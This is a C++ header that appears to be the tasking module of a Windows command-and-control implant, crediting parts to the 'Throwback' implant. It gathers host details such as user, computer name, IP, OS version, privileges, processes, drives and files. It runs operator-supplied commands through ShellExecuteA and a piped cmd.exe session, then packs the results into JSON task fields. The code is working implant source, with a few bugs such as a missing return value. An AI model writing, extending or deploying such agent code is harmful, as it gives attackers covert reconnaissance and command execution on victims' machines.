#ifndef AGENT_H
#define AGENT_H
#include <windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <Lmcons.h>
#include <string>
#include "Helper.h"

#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")

#include "json.hpp"
using json = nlohmann::json;

struct createthread_in
{
	json *j;
	int counter;
	std::string input;
};

void cd(std::string path)
{
	SetCurrentDirectoryA(path.c_str());
}

void cp(std::string src_file, std::string dest_file)
{
	CopyFileA(src_file.c_str(), dest_file.c_str(), FALSE);
}

void mv(std::string src_file, std::string dest_file)
{
	MoveFileA(src_file.c_str(), dest_file.c_str());
}

std::string get_internalip() //taken from throwback
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO *)LocalAlloc(LPTR, sizeof(IP_ADAPTER_INFO));

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		LocalFree(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)LocalAlloc(LPTR, ulOutBufLen);
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			std::string ipAddress = pAdapter->IpAddressList.IpAddress.String;
			if (ipAddress.find("0.0.0.0") == std::string::npos) {
				std::string interfaceName = pAdapter->Description;
				return ipAddress;
			}
			pAdapter = pAdapter->Next;
		}
	}
}

bool is_admin() //taken from Throwback
{
	HANDLE hToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
	if (EnablePrivilege(SE_DEBUG_NAME, hToken))
		return TRUE;
	else
		return FALSE;
}

std::string get_utctime()
{
	SYSTEMTIME st;
	GetSystemTime(&st);
	std::string return_string = std::to_string(st.wYear) + "-" + std::to_string(st.wMonth) + "-"
								+ std::to_string(st.wDay) + " " + std::to_string(st.wHour) + ":"
								+ std::to_string(st.wMinute) + ":" + std::to_string(st.wSecond);
	return return_string;
}

std::string get_version() //taken from Throwback
{
	typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);
	RTL_OSVERSIONINFOEXW osVers = { 0 };
	osVers.dwOSVersionInfoSize = sizeof(osVers);
	RtlGetVersionPtr getVersion = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
	if (getVersion)
	{
		getVersion(&osVers);
	}
		
	if (osVers.wProductType == VER_NT_WORKSTATION)
	{
		std::string return_string = std::to_string(osVers.dwMajorVersion) + "." + std::to_string(osVers.dwMinorVersion) + "W";
		return return_string;
	}
	else
	{
		std::string return_string = std::to_string(osVers.dwMajorVersion) + "." + std::to_string(osVers.dwMinorVersion) + "S";
		return return_string;
	}
}

std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}

std::string get_computername()
{
	TCHAR computername[UNLEN + 1];
	DWORD computername_len = UNLEN + 1;
	GetComputerName(computername, &computername_len);
	std::wstring computername_w(computername);
	std::string computername_s(computername_w.begin(), computername_w.end());
	return computername_s;
}

int get_pid()
{
	return GetCurrentProcessId();
}

std::string whoami()
{
	TCHAR computername[UNLEN + 1];
	DWORD computername_len = UNLEN + 1;
	GetComputerName(computername, &computername_len);

	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);

	std::wstring computername_w(computername);
	std::string computername_s(computername_w.begin(), computername_w.end());
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	std::string output = computername_s + "\\" + username_s;
	return output;
}

DWORD WINAPI whoami_thread(__in LPVOID lpParameter)
{
	// Break down LPVOID
	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
	json *j = thread_input->j;
	int i = thread_input->counter;

	// Perform pwd and stuff into json blob
	(*j)["task_output"][i] = whoami();
	(*j)["task_status"][i] = "complete";

	// Delete structure
	delete thread_input;

	return 0;
}

std::string pwd()
{
	TCHAR directory[UNLEN + 1];
	DWORD directory_len = UNLEN + 1;
	GetCurrentDirectory(directory_len, directory);
	std::wstring directory_w(directory);
	std::string directory_s(directory_w.begin(), directory_w.end());
	return directory_s;
}

DWORD WINAPI pwd_thread(__in LPVOID lpParameter)
{
	// Break down LPVOID
	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
	json *j = thread_input->j;
	int i = thread_input->counter;

	// Perform pwd and stuff into json blob
	(*j)["task_output"][i] = pwd();
	(*j)["task_status"][i] = "complete";

	// Delete structure
	delete thread_input;

	return 0;
}

std::string drives()
{
	std::string return_string = "";
	std::string alphabet[26] = { "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z" };
	DWORD drives_bit = GetLogicalDrives();
	int count = 0;
	while (count < 32)
	{
		if (drives_bit & 0x01) //checks least significant bit
		{
			//printf("%s:\\\n", alphabet[count]);
			return_string += alphabet[count] + ":\\\n";
		}
		count++; //iterate through dword
		drives_bit = drives_bit >> 1; //right shift 
	}
	return return_string;
}

DWORD WINAPI drives_thread(__in LPVOID lpParameter)
{
	// Break down LPVOID
	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
	json *j = thread_input->j;
	int i = thread_input->counter;

	// Perform pwd and stuff into json blob
	(*j)["task_output"][i] = drives();
	(*j)["task_status"][i] = "complete";

	// Delete structure
	delete thread_input;

	return 0;
}

//https://docs.microsoft.com/en-us/windows/desktop/toolhelp/taking-a-snapshot-and-viewing-processes
std::string ps()
{
	std::string return_string = "";
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &pe32) == TRUE)
	{
		while (Process32Next(hProcessSnap, &pe32) == TRUE)
		{
			MODULEENTRY32 me32;
			me32.dwSize = sizeof(MODULEENTRY32);
			HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
			Module32First(hModuleSnap, &me32);

			HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID); //handle to current process
			char full_path[UNLEN + 1];
			DWORD full_path_len = UNLEN + 1;

			if (pe32.th32ProcessID == me32.th32ProcessID) //ensure pe + me struct agree on PID
			{
				//std::cout << ps_arch(hProcess);
				//std::wcout << "PID: " << pe32.th32ProcessID << "     PPID: " << pe32.th32ParentProcessID << "     EXE: " << me32.szExePath << "\n";

				//convert from wide char to narrow char array
				char ch[sizeof(me32.szExePath)];
				char DefChar = ' ';
				WideCharToMultiByte(CP_ACP, 0, me32.szExePath, -1, ch, sizeof(me32.szExePath), &DefChar, NULL);
				std::string szExePath(ch);
				return_string += ps_arch(hProcess) + "PID: " + std::to_string(pe32.th32ProcessID) + "     PPID: " + std::to_string(pe32.th32ParentProcessID) + "     EXE: " + szExePath + "\n";
			}
			else
			{
				if (GetProcessImageFileNameA(hProcess, full_path, full_path_len)) //can we query file name?
				{
					//std::cout << (hProcess);
					//std::wcout << "PID: " << pe32.th32ProcessID << "     PPID: " << pe32.th32ParentProcessID << "     EXE: " << full_path << "\n";
					return_string += ps_arch(hProcess) + "PID: " + std::to_string(pe32.th32ProcessID) + "     PPID: " + std::to_string(pe32.th32ParentProcessID)
						+ "     EXE: " + full_path + "\n";
				}
				else //fall back to just exe no path
				{
					//std::cout << ps_arch(hProcess);
					//std::wcout << "PID: " << pe32.th32ProcessID << "     PPID: " << pe32.th32ParentProcessID << "     EXE: " << pe32.szExeFile << "\n";
					
					//convert from wide char to narrow char array
					char ch[sizeof(pe32.szExeFile)];
					char DefChar = ' ';
					WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, ch, sizeof(pe32.szExeFile), &DefChar, NULL);
					std::string szExeFile(ch);
					return_string += ps_arch(hProcess) + "PID: " + std::to_string(pe32.th32ProcessID) + "     PPID: " + std::to_string(pe32.th32ParentProcessID)
						+ "     EXE: " + szExeFile + "\n";
				}

			}
			CloseHandle(hModuleSnap);
		}
		CloseHandle(hProcessSnap);
	}
	return return_string;
}

DWORD WINAPI ps_thread(__in LPVOID lpParameter)
{
	// Break down LPVOID
	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
	json *j = thread_input->j;
	int i = thread_input->counter;

	// Perform pwd and stuff into json blob
	(*j)["task_output"][i] = ps();
	(*j)["task_status"][i] = "complete";

	// Delete structure
	delete thread_input;

	return 0;
}

std::string privs()
{
	std::string return_string = "";
	HANDLE hToken; //or skip OpenProcessToken() below and use  -> HANDLE hToken = GetCurrentProcessToken();
	TOKEN_PRIVILEGES ptp[UNLEN];
	DWORD token_info_len = UNLEN + 1;
	DWORD return_len = UNLEN + 1;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //instead of HANDLE hToken = GetCurrentProcessToken();
	{
		//std::wcout << "OpenProcessToken() success!\n";
	}
	if (GetTokenInformation(hToken, TokenPrivileges, &ptp, token_info_len, &return_len)) //obtain token information, output number of privileges
	{
		//std::wcout << "GetTokenInformation() success!\n";
		//std::wcout << "There are " << (*ptp).PrivilegeCount << " privileges.\n\n";
		return_string += "There are " + std::to_string((*ptp).PrivilegeCount) + " privileges.\n\n";
	}

	for (int x = 0; x <= (*ptp).PrivilegeCount - 1; x++) //loop through LUID_AND_ATTRIBUTES structure
	{
		LUID luid = (*ptp).Privileges[x].Luid;
		char lpName[MAX_PATH];
		DWORD cchName = UNLEN + 1;
		if (LookupPrivilegeNameA(NULL, &luid, lpName, &cchName))
		{
			//std::wcout << lpName << "\n";
			return_string += lpName;
			return_string += "\n";
		}
		else
		{
			//std::wcout << "GetLookupPrivilegeNameA() failure :(\n";
			//std::wcout << "Error: " << GetLastError() << "\n\n";
			return_string += "GetLookupPrivilegeNameA() failure! System Error: " + std::to_string(GetLastError());
		}
	}
	return return_string;
}

DWORD WINAPI privs_thread(__in LPVOID lpParameter)
{
	// Break down LPVOID
	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
	json *j = thread_input->j;
	int i = thread_input->counter;

	// Perform pwd and stuff into json blob
	(*j)["task_output"][i] = privs();
	(*j)["task_status"][i] = "complete";

	// Delete structure
	delete thread_input;

	return 0;
}

//https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirstfilea
//https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-_win32_find_dataa
//https://docs.microsoft.com/en-us/windows/desktop/fileio/listing-the-files-in-a-directory
std::string ls(std::string path)
{
	std::string return_string = "";
	std::string path_patch = path;

	DWORD path_flag = FileOrDirectory(path);
	if (path_flag == 0)
	{
		//do nothing
	}
	else if (path_flag == 1)
	{
		path_patch += "\\*";
	}
	else if (path == "")
	{
		path_patch = pwd() + "\\*";
	}
	else
	{
		return_string = "Could not open a handle to specified path. Typo? Quote your path if there are spaces?\n";
		return return_string;
	}
	WIN32_FIND_DATAA w32fd; //define structure that holds file data
	HANDLE hSearch = FindFirstFileA(path_patch.c_str(), &w32fd); //create search handle

	if (hSearch != INVALID_HANDLE_VALUE) //check search handle created successfully
	{
		//std::wcout << "FindFirstFileA() success!\n\n";
		//std::wcout << "Directory of " << path_patch.c_str() << "\n";
		return_string += "Directory of " + path_patch + "\n";
	}
	else if (hSearch == INVALID_HANDLE_VALUE) //print error
	{
		//std::wcout << "Invalid handle value.\n";
		//std::wcout << "System Error Code: " << GetLastError() << "\n";
		return_string += "Invalid handle value. System Error Code: " + std::to_string(GetLastError()) + "\n";
		return return_string;
	}

	do
	{
		DWORD filesize;
		FILETIME ft = w32fd.ftLastAccessTime;
		SYSTEMTIME st;

		//calculate last access time, write to stdout
		FileTimeToSystemTime(&ft, &st);
		//std::wcout << st.wMonth << "/" << st.wDay << "/" << st.wYear << " " << st.wHour << ":" << st.wMinute << " ";
		return_string += std::to_string(st.wMonth) + "/" + std::to_string(st.wDay) + "/" + std::to_string(st.wYear) + " " + std::to_string(st.wHour) + ":" + std::to_string(st.wMinute) + " ";

		//write filename
		//std::wcout << w32fd.cFileName << " ";
		std::string cFileName_temp = w32fd.cFileName;
		return_string += cFileName_temp + " ";

		//calculate filesize in bytes, write to stdout
		if (w32fd.nFileSizeHigh == NULL) //check high order value of filesize, is 0 if filesize < MAXDWORD
		{
			filesize = w32fd.nFileSizeLow;
		}
		else
		{
			filesize = (w32fd.nFileSizeHigh * (MAXDWORD + 1)) + w32fd.nFileSizeLow;
		}
		if (filesize)
		{
			//std::wcout << filesize << " bytes ";
			return_string += std::to_string(filesize) + " bytes ";
		}
			

		//write newline
		//std::wcout << "\n";
		return_string += "\n";
	} while (FindNextFileA(hSearch, &w32fd)); //loop through until FindNextFileA() returns 0		
	return return_string;
}

DWORD WINAPI ls_thread(__in LPVOID lpParameter)
{
	// Break down LPVOID
	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
	json *j = thread_input->j;
	int i = thread_input->counter;
	std::string path = thread_input->input;

	// Perform ls and stuff into json blob
	(*j)["task_output"][i] = ls(path);
	(*j)["task_status"][i] = "complete";


	// Delete structure
	delete thread_input;

	return 0;
}

std::string shell_exec(std::string user_input)
{
	std::string return_string = "no output";
	std::string file = user_input.substr(0, user_input.find(' '));
	std::string parameter = "";
	if ((user_input.find(" ") != std::string::npos)) //Check for additional parameters
	{
		parameter = user_input.substr(user_input.find(' '), std::string::npos);
	}
	//set last paramater to 0 when not testing
	if ((int)ShellExecuteA(NULL, NULL, file.c_str(), parameter.c_str(), NULL, 3) <= 32) //Magic number from MSDN docs 
	{
		return_string = "System Error: " + ConvertToString(GetLastError()) + "\n";
	}
	return return_string;
}

DWORD WINAPI shell_exec_thread(__in LPVOID lpParameter)
{
	// Break down LPVOID
	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
	json *j = thread_input->j;
	int i = thread_input->counter;
	std::string path = thread_input->input;

	// Perform shell_exec and stuff into json blob
	(*j)["task_output"][i] = shell_exec(path);
	(*j)["task_status"][i] = "complete";

	// Delete structure
	delete thread_input;

	return 0;
}

std::string create_process_exec(std::string user_input)
{
	std::string return_string = "";

	//Set parameters for CreatePipe()
	HANDLE hReadPipe_Out = NULL;
	HANDLE hWritePipe_Out = NULL;
	HANDLE hReadPipe_In = NULL;
	HANDLE hWritePipe_In = NULL;
	DWORD buffersize = 1024 * 8;

	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.lpSecurityDescriptor = NULL;
	saAttr.bInheritHandle = TRUE;

	// Create output pipe
	BOOL CreatePipeOut = CreatePipe(&hReadPipe_Out, &hWritePipe_Out, &saAttr, buffersize);
	if (CreatePipeOut == NULL)
	{
		return_string = "CreatePipe() fail! System Error: " + GetLastError(); +"\n";
		return return_string;
	}

	if (!SetHandleInformation(hReadPipe_Out, HANDLE_FLAG_INHERIT, 0))
	{
		printf("SetHandleInformation() fail! System Error: %d\n", GetLastError());
	}

	// Create input pipe
	BOOL CreatePipeIn = CreatePipe(&hReadPipe_In, &hWritePipe_In, &saAttr, buffersize);
	if (CreatePipeIn == NULL)
	{
		return_string = "CreatePipe() fail! System Error: " + GetLastError(); +"\n";
		return return_string;
	}

	if (!SetHandleInformation(hWritePipe_In, HANDLE_FLAG_INHERIT, 0))
	{
		printf("SetHandleInformation() fail! System Error: %d\n", GetLastError());
	}
	
	// Prepare CreateProcessA()
	std::string appname = "C:\\Windows\\System32\\cmd.exe";
	std::string commandline_temp = user_input + " &exit\n";
	LPSTR commandline = const_cast<char *>(commandline_temp.c_str());

	PROCESS_INFORMATION sProcInfo;
	ZeroMemory(&sProcInfo, sizeof(PROCESS_INFORMATION));

	STARTUPINFOA sStartInfo;
	ZeroMemory(&sStartInfo, sizeof(STARTUPINFOA));
	sStartInfo.cb = sizeof(STARTUPINFOA);
	sStartInfo.hStdError = hWritePipe_Out;
	sStartInfo.hStdOutput = hWritePipe_Out;
	sStartInfo.hStdInput = hReadPipe_In;
	sStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	BOOL bSuccess = FALSE;
	bSuccess = CreateProcessA(
		appname.c_str(),		   // application name
		NULL,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&sStartInfo,  // STARTUPINFO pointer 
		&sProcInfo);  // receives PROCESS_INFORMATION 

	if (bSuccess == NULL)
	{
		printf("CreateProcessA() fail! System Error: %d\n", GetLastError());
	}

	// Read in the initial header for cmd.exe and throw it away
	DWORD bytesAvailable;
	DWORD bytesRead;
	char buffer[4096];
	Sleep(2000);
	PeekNamedPipe(hReadPipe_Out, NULL, NULL, NULL, &bytesAvailable, NULL);
	ReadFile(hReadPipe_Out, buffer, sizeof(buffer), &bytesRead, NULL);

	// Send command to cmd.exe through anonymous pipe
	DWORD bytesread = NULL;
	if (!WriteFile(hWritePipe_In, commandline, strlen(commandline), &bytesread, NULL))
	{
		return_string = "Write to pipe fail.";
		return return_string;
	}
	
	// Close handles?
	CloseHandle(hWritePipe_In);
	CloseHandle(hWritePipe_Out);
	CloseHandle(sProcInfo.hProcess);
	CloseHandle(sProcInfo.hThread);
	
	// Read shell command output
	DWORD dwRead2;
	DWORD dwWritten2;
	CHAR chBuf2[4096];
	bSuccess = FALSE;
	for (;;)
	{
		bSuccess = ReadFile(hReadPipe_Out, chBuf2, 4096, &dwRead2, NULL);
		if (!(bSuccess) || (dwRead2 == 0))
		{
			break;
		}
		return_string.append(chBuf2, dwRead2);
	}
	
	// Remove input string that is echo'd by cmd.exe
	return (return_string.substr(return_string.find("\n") + 1));
}

DWORD WINAPI create_process_exec_thread(__in LPVOID lpParameter)
{
	// Break down LPVOID
	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
	json *j = thread_input->j;
	int i = thread_input->counter;
	std::string command = thread_input->input;
	std::string output = create_process_exec(command);
	printf("%s\n", output.c_str());
	// Perform shell_exec and stuff into json blob
	(*j)["task_status"][i] = "complete";
	(*j)["task_output"][i] = output;
	printf("updated\n");
	
	
	// Delete structure
	delete thread_input;

	return 0;
}

#endif